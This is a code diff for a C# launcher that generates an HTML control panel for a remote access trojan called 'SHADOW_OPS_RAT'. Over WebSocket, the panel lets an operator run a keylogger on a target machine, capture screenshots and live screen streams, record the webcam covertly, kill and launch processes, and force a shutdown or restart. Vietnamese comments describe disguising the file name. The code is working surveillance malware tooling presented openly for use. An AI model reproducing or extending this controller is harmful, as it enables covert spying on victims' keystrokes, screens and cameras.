@@ -8,385 +8,215 @@ namespace client
 {
     public partial class client : Form
     {
-        // ĐƯỜNG DẪN FILE WEB (Lưu với tên lạ để ngụy trang)
-        string htmlPath = Path.Combine(Application.StartupPath, "shadow_access.html");
+        string htmlPath = Path.Combine(Application.StartupPath, "shadow_ops.html");
 
-        // --- GIAO DIỆN BLACK OPS / MYSTERIOUS (HTML/CSS/JS) ---
-        // Đã thay thế toàn bộ dấu " thành ' để tránh lỗi cú pháp C#
         string htmlContent = @"
 <!DOCTYPE html>
 <html lang='en'>
 <head>
     <meta charset='UTF-8'>
-    <title>UNKNOWN@UID:0000</title>
+    <title>SHADOW_ROOT_ACCESS</title>
     <style>
-        .wrapper {
-            display: grid;
-            height: 100vh;
-            grid-template-columns: 180px calc(100vw - 360px) 180px;
-            grid-template-rows: 40px calc(100vh - 40px - 200px - 40px) 40px 200px !important;
-        }
-
-        /* ĐẶT FEED NÚT Ở HÀNG GRID SỐ 3 */
-        .surveillance-buttons {
-            grid-column: 2;
-            grid-row: 3;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
-        }
-
-        /* GIỮ ẢNH KHÔNG ĐÈ LÊN NÚT */
-        #visual-feed {
-            flex: 1;
-            border: 1px dashed var(--dim);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #050505;
-            overflow: hidden;
-        }
-
-        /* ĐẢM BẢO IMG/VIDEO KHÔNG PHÌNH QUÁ */
-        img, video {
-            width: 80%;
-            height: 800%;
-            object-fit: contain;
-            display: block;
-        }
-        #visual-feed img {
-            width: auto;
-            height: 100%;
-            max-width: 100%;
-            object-fit: contain;
-            display: block;
-        }
-
-        /* --- THEME: DARK WEB / MYSTERIOUS --- */
-        :root { 
-            --bg: #020202; 
-            --primary: #c0c0c0; /* Màu xám bạc bí ẩn */
-            --accent: #ff0033; /* Màu đỏ huyết cảnh báo */
-            --dim: #333;
-            --font: 'Consolas', 'Lucida Console', monospace;
-        }
-        * { box-sizing: border-box; outline: none; user-select: none; }
-        
-        body { 
-            background-color: var(--bg); color: var(--primary); 
-            font-family: var(--font); margin: 0; padding: 15px; 
-            height: 100vh; overflow: hidden; font-size: 12px;
-            background-image: radial-gradient(circle at center, #111 0%, #000 100%);
-        }
-
-        /* --- LAYOUT: DASHBOARD --- */
-        .wrapper {
-            display: grid;
-            grid-template-columns: 250px 1fr 300px;
-            grid-template-rows: 40px 1fr 200px;
-            gap: 10px; height: 100%;
-        }
-
-        /* --- BORDERS & CONTAINERS --- */
-        .box {
-            border: 1px solid var(--dim);
-            background: rgba(10, 10, 10, 0.8);
-            padding: 10px; position: relative;
-            display: flex; flex-direction: column;
-        }
-        .box::before { /* Trang trí góc */
-            content: ''; position: absolute; top: -1px; left: -1px; 
-            width: 10px; height: 10px; border-top: 2px solid var(--accent); border-left: 2px solid var(--accent); 
-        }
-
-        /* --- HEADER --- */
-        .header { grid-column: 1 / -1; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--dim); }
-        .title { font-size: 16px; font-weight: bold; letter-spacing: 2px; color: var(--accent); }
-        .blink { animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
-
-        /* --- CONTROLS --- */
-        h3 { margin: 0 0 10px 0; font-size: 11px; color: #666; text-transform: uppercase; border-bottom: 1px solid #222; padding-bottom: 2px; }
-        
-        input { 
-            background: #080808; border: 1px solid var(--dim); color: var(--accent); 
-            padding: 6px; width: 100%; font-family: var(--font); margin-bottom: 5px; text-align: center;
-        }
-        input:focus { border-color: var(--accent); }
-
-        button {
-            background: #000; color: #888; border: 1px solid var(--dim);
-            padding: 8px; width: 100%; margin-bottom: 4px; cursor: pointer;
-            font-family: var(--font); transition: 0.3s; text-transform: uppercase; font-size: 11px;
-        }
-        button:hover { border-color: var(--accent); color: var(--accent); text-shadow: 0 0 5px var(--accent); }
-        button:active { background: var(--accent); color: #000; }
-        
-        .danger-btn { border-color: #500; color: #a00; }
-        .danger-btn:hover { background: #300; color: red; }
-
-        /* --- TERMINAL / LOGS --- */
-        .log-box { grid-column: 1 / -1; background: #000; border-top: 2px solid var(--dim); overflow: hidden; height: 200px;}
-        #terminal { 
-            height: 100%; overflow-y: scroll; padding: 5px; font-size: 12px; color: #aaa; 
-        }
-        #terminal::-webkit-scrollbar { width: 4px; }
-        #terminal::-webkit-scrollbar-thumb { background: var(--dim); }
-        
-        .log-line { margin-bottom: 2px; }
-        .ts { color: #444; margin-right: 5px; }
-        .sys { color: var(--accent); font-weight: bold; }
-        .dat { color: #ccc; }
-
-        /* --- VISUAL FEED (CAM/SCREEN) --- */
-        #visual-feed {
-            flex: 1; border: 1px dashed var(--dim);
-            display: flex; align-items: center; justify-content: center;
-            background: #050505; color: #333; font-style: italic;
-        }
-        img, video { width: 100%; height: 100%; object-fit: contain; border: 1px solid var(--dim); }
-
-        /* --- TABLE STYLE --- */
-        table { width: 100%; border-collapse: collapse; font-size: 11px; color: #888; }
-        td, th { text-align: left; padding: 2px 5px; border-bottom: 1px solid #222; }
-        th { color: var(--accent); }
-        tr:hover { background: #111; color: #fff; }
-
+        :root { --bg: #050505; --panel: #111; --border: #333; --accent: #ff0000; --text: #ccc; }
+        body { background: var(--bg); color: var(--text); font-family: 'Consolas', monospace; margin: 0; padding: 10px; height: 100vh; overflow: hidden; font-size: 11px; box-sizing: border-box; }
+        .grid { display: grid; grid-template-columns: 2.5fr 5fr 2.5fr; grid-template-rows: 50px 1fr 200px; gap: 10px; height: 100%; }
+        .box { background: var(--panel); border: 1px solid var(--border); padding: 10px; display: flex; flex-direction: column; overflow: hidden; }
+        .box:hover { border-color: var(--accent); }
+        .box h3 { margin: 0 0 10px 0; color: var(--accent); border-bottom: 1px solid var(--accent); padding-bottom: 5px; font-size: 12px; font-weight: bold; letter-spacing: 1px; }
+        .header { grid-column: 1 / -1; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--accent); background: #000; }
+        .title { font-size: 20px; font-weight: bold; color: var(--accent); }
+        .ctrl-group { display: flex; gap: 5px; margin-bottom: 5px; }
+        input { background: #111; border: 1px solid #444; color: #fff; padding: 4px; flex: 1; text-align: center; font-family: inherit; font-size: 11px; }
+        button { background: #151515; color: #888; border: 1px solid #444; padding: 4px 10px; cursor: pointer; font-weight: bold; transition: 0.2s; font-family: inherit; font-size: 10px; width: 60px; }
+        button:hover { border-color: var(--accent); color: var(--accent); }
+        .scroll-box { flex: 1; overflow-y: auto; background: #000; border: 1px solid #222; padding: 5px; white-space: pre-wrap; word-break: break-all; }
+        table { width: 100%; border-collapse: collapse; } 
+        td { padding: 3px; border-bottom: 1px solid #222; white-space: nowrap; } 
+        tr:hover { background: #222; color: #fff; cursor: pointer; }
+        .pid { color: var(--accent); width: 50px; font-weight: bold; }
+        #media-view { flex: 1; border: 1px dashed #444; background: #000; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        img { max-width: 100%; max-height: 100%; object-fit: contain; }
     </style>
 </head>
 <body>
-    <div class='wrapper'>
+    <div class='grid'>
         <div class='box header'>
-            <div class='title'>/// SHADOW_ROOT_ACCESS /// <span class='blink'>_</span></div>
-            <div id='status' style='font-size:10px; color:#444'>NO CARRIER</div>
+            <div class='title'>/// SHADOW_OPS_RAT ///</div>
+            <div id='status' style='color:#555'>STATUS: DISCONNECTED</div>
         </div>
 
         <div class='box'>
-            <h3>>> UPLINK_CONFIG</h3>
-            <input id='ip' value='127.0.0.1' placeholder='TARGET_IP'>
-            <button onclick='connect()'>[ ESTABLISH UPLINK ]</button>
-            
-            <h3 style='margin-top:20px'>>> EXPLOIT_TOOLS</h3>
-            <button onclick=""send('LIST_APP')""> > DUMP PROCESSES</button>
-            <button onclick=""send('KEYLOG')""> > KEYLOGGER STREAM</button>
-            <button onclick=""disconnectWS()"" class=""danger-btn"">[ DISCONNECT ]</button>
+            <h3> APPLICATIONS</h3>
+            <button onclick=""send('LIST_APPS')"" style='width:100%'>REFRESH LIST</button>
+            <div class='ctrl-group'><input id='appNameStart' placeholder='App Name (e.g. notepad)'><button onclick=""startApp('appNameStart')"">START</button></div>
+            <div class='ctrl-group'><input id='appPidStop' placeholder='PID'><button onclick=""stopApp('appPidStop')"" style='color:#a00'>STOP</button></div>
+            <div class='scroll-box' id='list-apps'></div>
+        </div>
 
-            <div style='margin-top:10px; border-top:1px dashed #333; padding-top:10px'>
-                <input id='appName' placeholder='payload.exe'>
-                <button onclick=""startApp()""> > INJECT / RUN</button>
-                <input id='killId' placeholder='PID'>
-                <button onclick=""killApp()"" class='danger-btn'> > TERMINATE PID</button>
+        <div class='box'>
+            <h3>SURVEILLANCE</h3>
+            <div style='display:flex; gap:5px; margin-bottom:5px'>
+                <button onclick=""send('SCREENSHOT')"" style='flex:1'>SNAP</button>
+                <button onclick=""recWebcam()"" id='btnCam' style='flex:1; color:yellow'>REC 10s</button>
+                <button onclick=""send('RESUME_STREAM')"" >RESUME</button>
+                <button onclick=""send('STOP_STREAM')"" >STOP</button>
+
             </div>
-        </div>
-
-        <div class='box'>
-            <h3>>> SURVEILLANCE_FEED</h3>
-            <div id='visual-feed'>WAITING FOR SIGNAL...</div>
-            <div style='display:flex; gap:5px; margin-top:5px'>
-                <button onclick=""send('SCREENSHOT')"">SNAP_SCREEN</button>
-                <button onclick=""send('WEBCAM')"">REC_CAM (10s)</button>
-
-                <button onclick=""stopStream()"" class=""danger-btn"">STOP STREAM</button>
-                <button onclick=""resumeStream()"" style=""border-color:#0a0; color:#0f0;"">RESUME</button>
-            </div>
-        </div>
-
-        <div class='box'>
-            <h3 style='color:var(--accent)'>>> CRITICAL_OPS</h3>
-            <p style='font-size:10px; color:#555'>WARNING: IRREVERSIBLE ACTIONS</p>
-            <button class='danger-btn' onclick=""if(confirm('CONFIRM BLACKOUT?')) send('SHUTDOWN')""> [ FORCE SHUTDOWN ]</button>
-            <button class='danger-btn' onclick=""if(confirm('CONFIRM REBOOT?')) send('RESTART')""> [ SYSTEM REBOOT ]</button>
-            
-            <div style='margin-top:auto'>
-                <h3>>> NET_STATS</h3>
-                <div id='net-info' style='font-size:10px; color:#555'>
-                    Protocol: WSS<br>Encryption: TLS 1.3<br>Port: 8080 (Listen)
+            <div id='media-view'>NO SIGNAL</div>
+            <div style='margin-top:auto; padding-top:10px; border-top:1px solid #333'>
+                <label style='color:red; font-size:9px'>POWER OPS</label>
+                <div style='display:flex; gap:5px'>
+                    <button onclick=""if(confirm('SHUTDOWN?')) send('SHUTDOWN')"" style='color:red'>OFF</button>
+                    <button onclick=""if(confirm('RESTART?')) send('RESTART')"" style='color:orange'>RST</button>
+                    <button onclick=""send('DISCONNECT')"" style='color:green'>QUIT</button>
+                </div>
+                <div style='margin-top:10px'>
+                    <input id='ip' value='127.0.0.1' style='width:96%; margin-bottom:5px'>
+                    <button onclick='connect()' style='width:100%'>CONNECT</button>
                 </div>
             </div>
         </div>
 
-        <div class='box log-box'>
-            <div id='terminal'>
-                <div class='log-line'><span class='ts'>[BOOT]</span> <span class='sys'>SYSTEM:</span> <span class='dat'>Shadow interface loaded. Waiting for commands.</span></div>
+        <div class='box'>
+            <h3> PROCESSES</h3>
+            <button onclick=""send('LIST_PROCS')"" style='width:100%'>REFRESH LIST</button>
+            <div class='ctrl-group'><input id='procNameStart' placeholder='Process Name'><button onclick=""startApp('procNameStart')"">START</button></div>
+            <div class='ctrl-group'><input id='procPidStop' placeholder='PID'><button onclick=""stopApp('procPidStop')"" style='color:#a00'>STOP</button></div>
+            <div class='scroll-box' id='list-procs'></div>
+        </div>
+
+        <div class='box' style=""grid-column: 1 / -1;"">
+            <div style='display:flex; justify-content:space-between; align-items:center; margin-bottom:5px'>
+                <h3>[3] KEYLOGGER</h3>
+                <button id='btnKey' onclick=""toggleKeylog()"" style='width:150px; color:#0ff'>START KEYLOG</button>
+            </div>
+            <div id='terminal' class='scroll-box' style='font-family:monospace; color:#0f0; border:none'>
+                <div>[SYS] Ready.</div>
             </div>
         </div>
     </div>
 
     <script>
-        let streamEnabled = true;
-        let ws;
-        const term = document.getElementById('terminal');
+        var ws; 
+        var term = document.getElementById('terminal');
+        var isKeylogging = false;
 
-        // Hàm ghi log kiểu Hacker
-        function log(msg, source='SYS') {
-            let now = new Date();
-            let ts = now.getHours().toString().padStart(2,'0') + ':' + now.getMinutes().toString().padStart(2,'0') + ':' + now.getSeconds().toString().padStart(2,'0');
-            
-            let html = `<div class='log-line'>
-                <span class='ts'>[${ts}]</span> 
-                <span class='sys'>${source}:</span> 
-                <span class='dat'>${msg}</span>
-            </div>`;
-            term.innerHTML += html;
+        function log(msg, type) {
+            term.innerHTML += '<div>>> ' + msg + '</div>';
             term.scrollTop = term.scrollHeight;
-        }
-        function stopStream() {
-            streamEnabled = false;
-            log(""Live stream stopped."", ""SYS"");
-        } 
-        function resumeStream() {
-            streamEnabled = true;
-            log(""Live stream resumed."", ""SYS"");
-        }
-        function disconnectWS() {
-            if (ws && ws.readyState === WebSocket.OPEN) {
-                ws.close();
-                log(""Disconnected from server."", ""NET"");
-                document.getElementById(""status"").innerText = ""NO CARRIER"";
-                document.getElementById(""status"").style.color = ""#444"";
-            } else {
-                log(""No active connection to disconnect."", ""ERR"");
-            }
         }
 
         function connect() {
-            let ip = document.getElementById('ip').value;
-            let url = 'ws://' + ip + ':8080';
-            log('Initiating handshake with ' + url + '...', 'NET');
-            
-            try {
-                ws = new WebSocket(url);
-                ws.onopen = function() {
-                    document.getElementById('status').innerText = 'ENCRYPTED CONNECTION ESTABLISHED';
-                    document.getElementById('status').style.color = 'var(--accent)';
-                    document.getElementById('net-info').innerHTML = 'Target: LOCKED<br>Latency: 12ms<br>Access Level: ROOT';
-                    log('Uplink established successfully.', 'NET');
-                    log('Access granted. Welcome back, Administrator.', 'AUTH');
-                };
-                ws.onclose = function() {
-                    document.getElementById('status').innerText = 'NO CARRIER';
-                    document.getElementById('status').style.color = '#444';
-                    log('Connection lost / Target offline.', 'ERR');
-                };
-                ws.onerror = function() { log('Connection refused. Host unreachable.', 'ERR'); };
-                
-                ws.onmessage = function(e) {
-                    let d = e.data;
-                    if (d.startsWith(""LIVE|"")) {
-
-                        if (!streamEnabled) return; // ⭐ KHÔNG CẬP NHẬT NỮA ⭐
-
-                        let imgData = d.substring(5);
-                        document.getElementById('visual-feed').innerHTML =
-                            `<img src=""data:image/jpeg;base64,${imgData}"">`;
-                        return;
-                    }
-
-                    else if(d.startsWith('VID|')) {
-                        document.getElementById('visual-feed').innerHTML = `<video controls autoplay loop src='data:video/avi;base64,${d.substring(4)}'></video>`;
-                        log('Video stream buffer received.', 'DAT');
-                    }
-                    else if(d.startsWith('KEYLOG|')) {
-                        log('Decrypting keystrokes...', 'CMD');
-                        // Hiển thị keylog như một đoạn mã thô
-                        term.innerHTML += `<div style='border-left:2px solid var(--accent); padding-left:10px; color:#fff; font-family:monospace; margin:5px 0'>${d.substring(7)}</div>`;
-                        term.scrollTop = term.scrollHeight;
-                    }
-                    else if(d.startsWith('LIST_APP|')) {
-                        renderList(d.substring(9));
-                        log('Process table dump complete.', 'DAT');
-                    }
-                    else {
-                        log(d, 'INFO');
-                    }
-                };
-            } catch(e) { log('Critical exception: ' + e, 'ERR'); }
-        }
-
-        function send(c) {
-            if(ws && ws.readyState==1) {
-                ws.send(c);
-                log('Sending payload: ' + c, 'OUT');
-            } else {
-                log('Transmission failed. No uplink.', 'ERR');
-                alert('TARGET NOT CONNECTED');
-            }
-        }
-
-        function startApp() { send('START|'+document.getElementById('appName').value); }
-        function killApp() { send('KILL|'+document.getElementById('killId').value); }
-
-        function renderList(d) {
-            let rows = d.split(';');
-            let h = '<table><tr><th width=\'50\'>PID</th><th>PROCESS_NAME</th></tr>';
-            rows.forEach(r => {
-                if(r) {
-                    let p = r.split(',');
-                    // Pid màu đỏ, Tên màu xám
-                    h += `<tr><td style='color:var(--accent)'>${p[0]}</td><td>${p[1]}</td></tr>`;
+            var ip = document.getElementById('ip').value;
+            ws = new WebSocket('ws://' + ip + ':8080');
+            log('Connecting...');
+            ws.onopen = function() {
+                document.getElementById('status').innerText = 'STATUS: CONNECTED';
+                document.getElementById('status').style.color = '#0f0';
+                log('CONNECTED.');
+            };
+            ws.onmessage = function(e) {
+                var d = e.data;
+                if(d.startsWith('IMG|')) {
+                    document.getElementById('media-view').innerHTML = '<img src=\'data:image/jpeg;base64,' + d.substring(4) + '\'>';
                 }
-            });
-            h += '</table>';
-            term.innerHTML += `<div style='margin-top:5px; border:1px solid #333; padding:5px'>${h}</div>`;
-            term.scrollTop = term.scrollHeight;
+
+                else if (d.startsWith(""LIVE|"")) {
+                    document.getElementById(""media-view"").innerHTML =
+                        ""<img src='data:image/jpeg;base64,"" + d.substring(5) + ""'>"";
+                }
+
+                else if(d.startsWith('VID|')) {
+                    var base64Video = d.substring(4);
+                    log('Video received. Downloading...');
+                    var a = document.createElement('a');
+                    a.href = 'data:video/avi;base64,' + base64Video;
+                    a.download = 'webcam_' + new Date().getTime() + '.avi';
+                    a.click();
+                    var btn = document.getElementById('btnCam');
+                    btn.disabled = false; btn.innerText = 'REC 10s';
+                }
+                else if(d.startsWith('LIST_APPS|')) renderList(d.substring(10), 'list-apps', 'appPidStop', 'appNameStart');
+                else if(d.startsWith('LIST_PROCS|')) renderList(d.substring(11), 'list-procs', 'procPidStop', 'procNameStart');
+                else if(d.startsWith('KEYLOG|')) log(d.substring(7));
+                else log(d);
+            };
+
+            ws.onclose = function() {
+                log('Disconnected from server.');
+                document.getElementById('media-view').innerHTML = 'NO SIGNAL';
+                document.getElementById('status').innerText = 'STATUS: DISCONNECTED';
+                document.getElementById('status').style.color = '#f00';
+            };
+
+            ws.onerror = function(err) {
+                console.error('WebSocket error:', err);
+                document.getElementById('media-view').innerHTML = 'NO SIGNAL';
+            };
         }
+
+        function send(c) { if(ws && ws.readyState==1) ws.send(c); else log('Error: Not Connected'); }
+        function startApp(id) { var n = document.getElementById(id).value; if(n) { send('START|'+n); log('Request Start: '+n); } }
+        function stopApp(id) { var p = document.getElementById(id).value; if(p) { send('KILL|'+p); log('Request Kill PID: '+p); } }
+        function recWebcam() { send('WEBCAM_START'); log('Requesting 10s video...'); var btn = document.getElementById('btnCam'); btn.disabled = true; btn.innerText = 'REC...'; }
+
+        function toggleKeylog() {
+            var btn = document.getElementById('btnKey');
+            if (!isKeylogging) {
+                send('KEYLOG_START'); isKeylogging = true;
+                btn.innerText = 'STOP & GET LOGS'; btn.style.color = 'yellow';
+                log('Keylogger Started...');
+            } else {
+                send('KEYLOG_STOP'); isKeylogging = false;
+                btn.innerText = 'START KEYLOG'; btn.style.color = '#0ff';
+                log('Fetching logs...');
+            }
+            btn.blur(); // QUAN TRỌNG: Bỏ focus để ấn Space không bị tắt
+        }
+
+        function fill(idStop, idStart, pid, name) {
+            document.getElementById(idStop).value = pid;
+            var startName = name;
+            if(name.indexOf('[') > -1) startName = name.split('[')[1].replace(']', '').trim();
+            document.getElementById(idStart).value = startName;
+        }
+
+        function renderList(data, divId, idStop, idStart) {
+            var rows = data.split(';'); 
+            var html = '<table>';
+            html += '<tr style=\'color:#666\'><td style=\'width:50px\'>PID</td><td>NAME</td></tr>';
+            for(var i=0; i<rows.length; i++) {
+                var r = rows[i];
+                if(r) {
+                    var p = r.split('|||'); // Tách bằng ||| để không lỗi
+                    if(p.length >= 2) {
+                        var safeName = p[1].replace(/'/g, ''); 
+                        html += '<tr onclick=""fill(\'' + idStop + '\', \'' + idStart + '\', \'' + p[0] + '\', \'' + safeName + '\')"">';
+                        html += '<td class=\'pid\'>' + p[0] + '</td><td>' + p[1] + '</td></tr>';
+                    }
+                }
+            }
+            document.getElementById(divId).innerHTML = html + '</table>';
+        }
+
     </script>
 </body>
 </html>";
 
         public client()
         {
-            InitializeComponent();
-
-            // --- THIẾT LẬP GIAO DIỆN LAUNCHER (C#) ---
-            this.Controls.Clear();
-            this.Text = "SHADOW LAUNCHER"; // Tên cửa sổ bí ẩn
-            this.Size = new Size(500, 250);
+            this.Text = "SHADOW OPS LAUNCHER";
+            this.Size = new Size(400, 200);
+            this.BackColor = Color.Black;
             this.StartPosition = FormStartPosition.CenterScreen;
-            this.BackColor = Color.FromArgb(5, 5, 5); // Đen tuyền
-            this.FormBorderStyle = FormBorderStyle.FixedToolWindow; // Bỏ các nút phóng to thu nhỏ thừa
-
-            // Label tiêu đề
-            Label lbl = new Label();
-            lbl.Text = "SHADOW ACCESS TOOL\n[ UNAUTHORIZED USE PROHIBITED ]";
-            lbl.ForeColor = Color.Crimson; // Màu đỏ đậm
-            lbl.Font = new Font("Consolas", 14, FontStyle.Bold);
-            lbl.Dock = DockStyle.Top;
-            lbl.Height = 80;
-            lbl.TextAlign = ContentAlignment.MiddleCenter;
-            this.Controls.Add(lbl);
-
-            // Nút bấm mở Edge
-            Button btn = new Button();
-            btn.Text = ">> INITIALIZE INTERFACE (EDGE) <<";
-            btn.Size = new Size(400, 50);
-            btn.Location = new Point(40, 100);
-            btn.BackColor = Color.FromArgb(20, 20, 20);
-            btn.ForeColor = Color.LightGray;
-            btn.FlatStyle = FlatStyle.Flat;
-            btn.FlatAppearance.BorderColor = Color.Crimson;
-            btn.Font = new Font("Consolas", 11, FontStyle.Bold);
-            btn.Cursor = Cursors.Hand;
-            btn.Click += (s, e) => { OpenEdge(); };
+            Button btn = new Button(); btn.Text = "LAUNCH DASHBOARD"; btn.Dock = DockStyle.Fill;
+            btn.ForeColor = Color.Red; btn.BackColor = Color.Black; btn.FlatStyle = FlatStyle.Flat;
+            btn.Font = new Font("Consolas", 14, FontStyle.Bold);
+            btn.Click += (s, e) => { OpenWeb(); };
             this.Controls.Add(btn);
-
-            // Tự động tạo file và mở
-            try { File.WriteAllText(htmlPath, htmlContent); } catch { }
-            OpenEdge();
+            OpenWeb();
         }
 
-        void OpenEdge()
-        {
-            try
-            {
-                Process.Start("msedge.exe", "--start-maximized \"" + htmlPath + "\"");
-
-            }
-            catch (Exception ex)
-            {
-                MessageBox.Show("Error launching interface: " + ex.Message);
-            }
-        }
+        void OpenWeb() { try { File.WriteAllText(htmlPath, htmlContent); Process.Start("msedge.exe", "\"" + htmlPath + "\""); } catch { } }
     }
 }
